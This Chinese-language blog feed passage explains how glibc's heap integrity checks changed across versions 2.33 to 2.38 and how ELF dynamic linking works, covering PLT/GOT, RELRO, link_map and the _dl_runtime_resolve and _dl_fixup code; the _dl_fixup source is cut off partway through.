detected&quot;</span>);</span><br></pre></td></tr></table></figure><p>tcache_get取出chunk时会有对齐检查</p><h1 id="glibc2-33"><a href="#glibc2-33" class="headerlink" title="glibc2.33"></a>glibc2.33</h1><h2 id="free-3"><a href="#free-3" class="headerlink" title="free"></a>free</h2><h3 id="ftcache-1-2"><a href="#ftcache-1-2" class="headerlink" title="@ftcache-1"></a>@ftcache-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>)</span><br></pre></td></tr></table></figure><p>判断doublefree时,会检查tcache链上的chunk数目是否超过限制</p><p>之前虽然也会与mp_.tcache_count比较,但只是作为一些分支的条件,并不会检查错误</p><p>除此之外tcache_counts几乎没有其他检查了</p><h1 id="glibc2-34"><a href="#glibc2-34" class="headerlink" title="glibc2.34"></a>glibc2.34</h1><p>无显著变化</p><h1 id="glibc2-35"><a href="#glibc2-35" class="headerlink" title="glibc2.35"></a>glibc2.35</h1><p>无显著变化</p><h1 id="glibc2-37"><a href="#glibc2-37" class="headerlink" title="glibc2.37"></a>glibc2.37</h1><p>无显著变化</p><h1 id="glibc2-38"><a href="#glibc2-38" class="headerlink" title="glibc2.38"></a>glibc2.38</h1><h2 id="malloc-4"><a href="#malloc-4" class="headerlink" title="malloc"></a>malloc</h2><h3 id="munsortedbin-2-1"><a href="#munsortedbin-2-1" class="headerlink" title="-munsortedbin-2"></a>-munsortedbin-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>移除该检查,因为其实前面已经做过一次检查了,这个检查有些重复</p>]]></content>
    
    
    <summary type="html">glibc各个版本检查机制发生的变化</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="安全检查" scheme="https://ixout.github.io/tags/%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5/"/>
    
    <category term="glibc" scheme="https://ixout.github.io/tags/glibc/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>elf动态链接</title>
    <link href="https://ixout.github.io/posts/19785/"/>
    <id>https://ixout.github.io/posts/19785/</id>
    <published>2023-07-23T02:22:35.000Z</published>
    <updated>2023-12-02T05:40:40.767Z</updated>
    
    <content type="html"><![CDATA[<h1 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h1><h2 id="plt-amp-amp-plt-got-amp-amp-plt-sec"><a href="#plt-amp-amp-plt-got-amp-amp-plt-sec" class="headerlink" title=".plt&amp;&amp;.plt.got&amp;&amp;.plt.sec"></a>.plt&amp;&amp;.plt.got&amp;&amp;.plt.sec</h2><p><strong>所在segment:代码段</strong></p><p><strong>plt表说是表但其实其中的代码都是用来运行的</strong></p><p>PLT : 程序链接表（PLT，Procedure Link Table）</p><p>调用链接器来解析某个外部函数的地址, 并填充到GOT表中, 然后跳转到该函数; 或者直接在GOT中查找并跳转到对应外部函数(如果非首次调用).</p><p>PLT表可能四种情况:</p><ol><li><code>只有.plt</code></li><li><code>`.plt和.plt.got</code></li><li><code>.plt和.plt,sec</code></li><li><code>.plt和.plt,sec和.plt.got</code></li></ol><hr><p>在延迟绑定环境下,每一个函数对应的PLT表项有三个字段</p><ol><li>code:跳转到对应的got表项中的地址</li><li>code:压栈,该参数是对应函数在.rel.plt上的偏移,是写定的</li><li>code:<strong>跳转到公共项plt[0]</strong></li></ol><p><strong>公共项plt[0]处的代码push GOT[1]然后jmp GOT[2]</strong></p><p>在使用了intel cet技术后,在code1和code2字段前会各加一个endbr64指令</p><p>且只要存在<code>.plt.sec</code>节,那么code1一般都位于其中</p><p>code2和code3以及公共项都位于<code>.plt</code>节</p><h2 id="got-amp-amp-got-plt"><a href="#got-amp-amp-got-plt" class="headerlink" title=".got &amp;&amp; .got.plt"></a>.got &amp;&amp; .got.plt</h2><p><strong>所在segment:数据段</strong></p><p>got表就真的只是表了,只存储内容非运行代码</p><p>GOT : 全局偏移表（GOT, Global Offset Table）</p><p>包括了<code>.got</code>和<code>.got.plt</code>.</p><p><strong>有时<code>.got</code>和<code>.got.plt</code>同时存在,有时只有<code>.got</code>,与relro模式相关</strong></p><p>got表相当于plt的GOT全局偏移表, 其内容有两种情况:</p><ol><li>如果在之前查找过该符号, 内容为外部函数的具体地址. </li><li>如果没查找过, 则内容为对应函数PLT表第二个表项的地址.</li></ol><p>在x86架构下, 除了每个函数占用一个GOT表项外，GOT表项还保留了 3个公共表项,  保存在前三个位置, 分别是:</p><ul><li>got[0]: 本ELF动态段(.dynamic段)的装载地址,初始不为空,就位于elf中</li><li>got<a href="http://www.cs.stevens.edu/~jschauma/810/elf.html">1</a>: 本ELF的<code>link_map</code>数据结构描述符地址,初始为空,程序开始前初始化</li><li>got<a href="http://www.cs.dartmouth.edu/~sergey/cs108/dyn-linking-with-gdb.txt">2</a>: <code>_dl_runtime_resolve</code>函数的地址,初始为空,程序开始前初始化</li></ul><p>如果<code>.got</code>和<code>.got.plt</code>同时存在,这三个表项位于<code>.got.plt</code>,否则位于<code>.got</code></p><p><code>FULL RELRO</code>下,got[1]和got[2]不初始化</p><p><code>Partial RELRO</code>和<code>No RELRO</code>则在程序正式开始前由<code>_dl_start_user</code>完成初始化,</p><p>其中, <code>link_map</code>数据结构的定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* Shared library&#x27;s load address. */</span></span><br><span class="line">ElfW(Addr) l_addr;</span><br><span class="line"><span class="comment">/* Pointer to library&#x27;s name in the string table. */</span>                                    <span class="type">char</span> *l_name;</span><br><span class="line"><span class="comment">/*         Dynamic section of the shared object.</span></span><br><span class="line"><span class="comment">           Includes dynamic linking info etc.</span></span><br><span class="line"><span class="comment">           Not interesting to us.</span></span><br><span class="line"><span class="comment">           */</span>                      </span><br><span class="line">ElfW(Dyn) *l_ld;      </span><br><span class="line"><span class="comment">/* Pointer to previous and next link_map node. */</span>                    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="imapct-of-RELRO"><a href="#imapct-of-RELRO" class="headerlink" title="imapct of RELRO"></a>imapct of RELRO</h2><p>这篇文章讲的动态链接延迟绑定</p><p>是指在RELRO保护为<code>Partial RELRO和No RELRO</code>的情况下部分函数进行的延迟绑定</p><hr><p>当RELRO保护为<code>FULL RELRO</code>的情况下<br>函数的动态链接会在程序进入main之前(start函数中)便完成,所有函数第一次调用时GOT表皆已指向真实函数地址</p><p><code>Parital RELRO和No RELRO</code>下<strong>部分</strong>函数也是这样</p><p>栈回溯如下</p><figure class="highlight plaintext"><figcaption><span>backtrace</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">►  f 0   0x7ffff7fdd80d _dl_relocate_object+3613</span><br><span class="line">   f 1   0x7ffff7fdd80d _dl_relocate_object+3613</span><br><span class="line">   f 2   0x7ffff7fd353a dl_main+8026</span><br><span class="line">   f 3   0x7ffff7febc4b _dl_sysdep_start+1355</span><br><span class="line">   f 4   0x7ffff7fd104c _dl_start+604</span><br><span class="line">   f 5   0x7ffff7fd104c _dl_start+604</span><br><span class="line">   f 6   0x7ffff7fd0108 _dl_start_user</span><br><span class="line">   f 7              0x1</span><br></pre></td></tr></table></figure><h3 id="FULL-RELRO"><a href="#FULL-RELRO" class="headerlink" title="FULL RELRO"></a>FULL RELRO</h3><p>FULL RELRO情况下,一般只会有一个<code>.got</code>节(.got.plt并入其中)</p><p>程序正式进行之前,所有函数的动态链接完成后</p><p><strong>会使用mprotect将<code>.got</code>表所在页的写权限禁止</strong></p><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p><code>Parital RELRO</code>情况下,会有<code>.got</code>节和<code>.got.plt</code>节</p><p>将函数分为两个部分</p><p><code>.got</code>中的函数,在main函数之前完成动态链接,<strong>并由mprotect禁止<code>.got</code>所在页写权限</strong></p><p><code>.got.plt</code>中的函数,则是按照正常的延迟绑定流程进行,并且一直拥有写权限</p><h3 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h3><p><code>No RELRO</code>和Parital一样会有<code>.got</code>节和<code>.got.plt</code>节</p><p>函数同样分为两个部分</p><p><code>.got</code>中的函数,同样在main函数之前完成动态链接</p><p><code>.got.plt</code>中的函数,同样按照正常的延迟绑定流程进行</p><p>不同的是,<code>No RELRO</code>不禁止GOT表的任何写权限</p><h2 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h2><p>包含了很多动态链接所需的关键信息，在动态链接中我们主要关注DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p><p>结构体成员的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf64_Dyn struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x8</span>, copyof_3)</span><br><span class="line"><span class="number">00000000</span>                                        </span><br><span class="line"><span class="number">00000000</span>                                  </span><br><span class="line"><span class="number">00000000</span> d_tag dq ?<span class="comment">//在link_map成员l_info中的下标</span></span><br><span class="line"><span class="number">00000008</span> d_un dq ?</span><br><span class="line"><span class="number">00000010</span> Elf64_Dyn ends</span><br></pre></td></tr></table></figure><p>其中的d_un是个联合体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    Elf64_Xword d_val;</span><br><span class="line">    Elf64_Addr d_ptr;</span><br><span class="line">&#125; d_un;</span><br></pre></td></tr></table></figure><hr><p>除了上述提及的三个成员,.dynamic中还存在不少符号信息(init,fini等等),其中还有一个可能要用到的是DT_DEBUG成员,它指向<strong>_r_debug全局结构体</strong>,在其中能够找到<strong>link_map</strong>地址(一般是其第二个成员)</p><h2 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h2><p>一个字符串表,包含着动态链接所需要的符号,表项是字符串以0结尾,当要引用某个字符串时,用的时相对这个secticon头的偏移</p><h2 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h2><p>这个节是一个符号表（结构体数组），里面记录了各种符号的信息，每个表项是一个结构体每个结构体对应一个符号。</p><p>64位和32位中改结构体有些差异,以64位为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf64_Sym struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, mappedto_1)</span><br><span class="line"><span class="number">00000000</span>                                      </span><br><span class="line"><span class="number">00000000</span>                                      </span><br><span class="line"><span class="number">00000000</span> st_name dd ?                 <span class="comment">//函数名字符串在.dynstr中的偏移           </span></span><br><span class="line"><span class="number">00000004</span> st_info db ?                <span class="comment">//对导入函数而言,为固定的0x12</span></span><br><span class="line"><span class="number">00000005</span> st_other db ?               <span class="comment">//对导入函数而言,剩下的都为0</span></span><br><span class="line"><span class="number">00000006</span> st_shndx dw ?                </span><br><span class="line"><span class="number">00000008</span> st_value dq ?                          </span><br><span class="line"><span class="number">00000010</span> st_size dq ?</span><br><span class="line"><span class="number">00000018</span> Elf64_Sym ends</span><br></pre></td></tr></table></figure><h2 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h2><p>它是重定位表,也是一个结构体数组，每个项对应一个导入函数。</p><p>64位和32位中改结构体有些差异,以64位为例,结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf64_Rela struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, copyof_2)</span><br><span class="line"><span class="number">00000000</span>                                </span><br><span class="line"><span class="number">00000000</span>                                         </span><br><span class="line"><span class="number">00000000</span> r_offset dq ?      <span class="comment">//存储导入函数的got表地址</span></span><br><span class="line"><span class="number">00000008</span> r_info dq ?<span class="comment">//对导入函数而言,该值等于[函数序号&lt;&lt;32]+7  32位下&lt;&lt;8</span></span><br><span class="line"><span class="number">00000010</span> r_addend dq ?<span class="comment">//对导入函数而言为0</span></span><br><span class="line"><span class="number">00000018</span> Elf64_Rela ends</span><br></pre></td></tr></table></figure><h2 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a>link_map</h2><p>对整个elf生命周期都非常重要的一个结构体,结构体非常大,声明有几百行</p><p>详见glibc/include/link.h</p><p>简单看一下常用的几个成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;</span><br><span class="line">    <span class="type">char</span> *l_name;</span><br><span class="line">    Elf64_Dyn *l_ld;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">77</span>];</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个普通的程序启动后,会有四个link_map结构</p><p>通过l_next和l_prev链接,以l_next为正序的话,四个link_map分别对应</p><p><code>running elf -&gt; vdso -&gt; libc -&gt; ld</code></p><p>link_map用到较多的是l_info,其是一个指针线性表,程序开始时便会用<code>.dynmaic</code>段的表项地址去初始化它,在resolve时会利用这这些指针去访问<code>.dynamic</code>段中的各个表项</p><h1 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h1><p> 整个过程可以概述为</p><h2 id="dl-runtime-resolve-link-map-reloc-arg"><a href="#dl-runtime-resolve-link-map-reloc-arg" class="headerlink" title="_dl_runtime_resolve(link_map,reloc_arg)"></a>_dl_runtime_resolve(link_map,reloc_arg)</h2><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针,初始化时就将<code>.dynamic</code>中的各表项地址用于初始化<code>link_map</code></li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 固定数</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol><hr><p>_dl_runtime_resolve直接由汇编写成,见<code>glibc/sysdeps/x86_64/dl-trampoline.h</code></p><p>不过代码有点难读直接放实际运行时dump下来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function _dl_runtime_resolve_xsavec:</span><br><span class="line">   0x00007ffff7fe7bc0 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x00007ffff7fe7bc4 &lt;+4&gt;:push   rbx</span><br><span class="line">   0x00007ffff7fe7bc5 &lt;+5&gt;:mov    rbx,rsp</span><br><span class="line">   0x00007ffff7fe7bc8 &lt;+8&gt;:and    rsp,0xffffffffffffffc0</span><br><span class="line">   0x00007ffff7fe7bcc &lt;+12&gt;:sub    rsp,QWORD PTR [rip+0x14b35]        # 0x7ffff7ffc708 &lt;_rtld_global_ro+232&gt;</span><br><span class="line">   0x00007ffff7fe7bd3 &lt;+19&gt;:mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x00007ffff7fe7bd7 &lt;+23&gt;:mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x00007ffff7fe7bdc &lt;+28&gt;:mov    QWORD PTR [rsp+0x10],rdx</span><br><span class="line">   0x00007ffff7fe7be1 &lt;+33&gt;:mov    QWORD PTR [rsp+0x18],rsi</span><br><span class="line">   0x00007ffff7fe7be6 &lt;+38&gt;:mov    QWORD PTR [rsp+0x20],rdi</span><br><span class="line">   0x00007ffff7fe7beb &lt;+43&gt;:mov    QWORD PTR [rsp+0x28],r8</span><br><span class="line">   0x00007ffff7fe7bf0 &lt;+48&gt;:mov    QWORD PTR [rsp+0x30],r9</span><br><span class="line">   0x00007ffff7fe7bf5 &lt;+53&gt;:mov    eax,0xee</span><br><span class="line">   0x00007ffff7fe7bfa &lt;+58&gt;:xor    edx,edx</span><br><span class="line">   0x00007ffff7fe7bfc &lt;+60&gt;:mov    QWORD PTR [rsp+0x250],rdx</span><br><span class="line">   0x00007ffff7fe7c04 &lt;+68&gt;:mov    QWORD PTR [rsp+0x258],rdx</span><br><span class="line">   0x00007ffff7fe7c0c &lt;+76&gt;:mov    QWORD PTR [rsp+0x260],rdx</span><br><span class="line">   0x00007ffff7fe7c14 &lt;+84&gt;:mov    QWORD PTR [rsp+0x268],rdx</span><br><span class="line">   0x00007ffff7fe7c1c &lt;+92&gt;:mov    QWORD PTR [rsp+0x270],rdx</span><br><span class="line">   0x00007ffff7fe7c24 &lt;+100&gt;:mov    QWORD PTR [rsp+0x278],rdx</span><br><span class="line">   0x00007ffff7fe7c2c &lt;+108&gt;:xsavec [rsp+0x40]</span><br><span class="line">   0x00007ffff7fe7c31 &lt;+113&gt;:mov    rsi,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7fe7c35 &lt;+117&gt;:mov    rdi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007ffff7fe7c39 &lt;+121&gt;:call   0x7ffff7fe00c0 &lt;_dl_fixup&gt;</span><br><span class="line">   0x00007ffff7fe7c3e &lt;+126&gt;:mov    r11,rax</span><br><span class="line">   0x00007ffff7fe7c41 &lt;+129&gt;:mov    eax,0xee</span><br><span class="line">   0x00007ffff7fe7c46 &lt;+134&gt;:xor    edx,edx</span><br><span class="line">   0x00007ffff7fe7c48 &lt;+136&gt;:xrstor [rsp+0x40]</span><br><span class="line">   0x00007ffff7fe7c4d &lt;+141&gt;:mov    r9,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x00007ffff7fe7c52 &lt;+146&gt;:mov    r8,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x00007ffff7fe7c57 &lt;+151&gt;:mov    rdi,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x00007ffff7fe7c5c &lt;+156&gt;:mov    rsi,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x00007ffff7fe7c61 &lt;+161&gt;:mov    rdx,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x00007ffff7fe7c66 &lt;+166&gt;:mov    rcx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7fe7c6b &lt;+171&gt;:mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7fe7c6f &lt;+175&gt;:mov    rsp,rbx</span><br><span class="line">   0x00007ffff7fe7c72 &lt;+178&gt;:mov    rbx,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7fe7c76 &lt;+182&gt;:add    rsp,0x18</span><br><span class="line">   0x00007ffff7fe7c7a &lt;+186&gt;:bnd jmp r11</span><br></pre></td></tr></table></figure><h2 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup"></a>_dl_fixup</h2><p>_dl_runtime_resolve的主体其实是调用_dl_fixup</p><p>当然_dl_fixup也调用了不少函数,暂时不深入,重点关注_dl_fixup</p><p><strong>_dl_fixup</strong>是在glibc/elf/dl-runtime.c实现的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">uintptr_t</span> pltgot = (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">      + reloc_offset (pltgot, reloc_arg));</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span 